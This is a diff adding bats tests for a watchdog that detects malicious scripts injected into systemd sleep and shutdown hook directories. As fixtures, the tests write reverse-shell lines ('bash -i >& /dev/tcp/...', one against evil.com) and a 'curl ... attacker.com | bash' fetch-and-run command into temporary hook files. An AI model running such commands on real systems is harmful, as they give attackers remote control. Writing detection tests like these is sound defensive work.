@@ -186,3 +186,44 @@ seed_benign() {
     main_count=$(cap | grep -cE '^-t selfdef-systemd-power-hooks -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): systemd-power-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/grub-common"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"power_hooks_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\n# grub-common\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "system-sleep hook"\n' > "${HOOKD}/grub-common"
+    run_wd
+    ! cap | grep -q '"event":"power_hooks_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multi-dir scan: /usr/lib/systemd/system-sleep + /etc/systemd/system-sleep + system-shutdown axes — injection in ANY → alert)" {
+    HOOKD2="${TMP}/system-shutdown"; mkdir -p "${HOOKD2}"
+    seed_benign
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-shutdown-hook"
+    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/grub-common"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
